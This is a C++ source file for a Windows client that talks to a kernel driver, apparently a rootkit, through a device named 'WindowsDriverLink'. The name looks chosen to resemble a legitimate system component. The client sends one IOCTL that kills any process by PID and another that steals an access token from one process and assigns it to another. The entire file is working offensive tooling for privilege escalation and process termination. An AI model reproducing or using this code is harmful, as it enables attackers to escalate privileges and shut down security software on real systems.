#include <iostream>
#include <Windows.h>
#include <string>

#define IOCTL_STOP_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_STEAL_TOKEN CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

void usage(char* arg0)
{
    printf("Usage: \n\t%s [PID] - for stop process with PID\n\t%s [TARGET_PID] [SOURCE_PID] - for steal token from Source to Target\n", arg0, arg0);
}

int main(char argc, char** argv)
{
    CHAR outBuffer[4096] = { 0 };
    HANDLE device = INVALID_HANDLE_VALUE;
    BOOL status = FALSE;
    DWORD bytesReturned = 0;
    device = CreateFileW(L"\\\\.\\WindowsDriverLink", GENERIC_WRITE | GENERIC_READ | GENERIC_EXECUTE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (device == INVALID_HANDLE_VALUE)
    {
        printf_s("> Could not open device: 0x%x\n", GetLastError());
        return -1;
    }
    else if (argc == 2)
    {
        unsigned short inBuffer = std::stoi(argv[1]);
        printf_s("> Issuing IOCTL_STOP_PROCESS 0x%x\n", IOCTL_STOP_PROCESS);
        status = DeviceIoControl(device, IOCTL_STOP_PROCESS, &inBuffer, sizeof(inBuffer), outBuffer, sizeof(outBuffer), &bytesReturned, (LPOVERLAPPED)NULL);
        printf_s("> IOCTL_STOP_PROCESS 0x%x issued\n", IOCTL_STOP_PROCESS);
        printf_s("> Received from the kernel land: %s. Received buffer size: %d\n", outBuffer, bytesReturned);
    }
    else if (argc == 3) 
    {
        union Data
        {
            unsigned short out[2];
            unsigned int in;
        };

        Data input_data{ 0 };
        input_data.out[0] = std::stoi(argv[1]);
        input_data.out[1] = std::stoi(argv[2]);

        unsigned int inBuffer = input_data.in;
        printf_s("> Issuing IOCTL_STEAL_TOKEN 0x%x\n", IOCTL_STEAL_TOKEN);
        status = DeviceIoControl(device, IOCTL_STEAL_TOKEN, &inBuffer, sizeof(inBuffer), outBuffer, sizeof(outBuffer), &bytesReturned, (LPOVERLAPPED)NULL);
        printf_s("> IOCTL_STEAL_TOKEN 0x%x issued\n", IOCTL_STEAL_TOKEN);
        printf_s("> Received from the kernel land: %s. Received buffer size: %d\n", outBuffer, bytesReturned);
    }
    else
    {
        usage(argv[0]);
        return -1;
    }
    CloseHandle(device);
    return 0;
}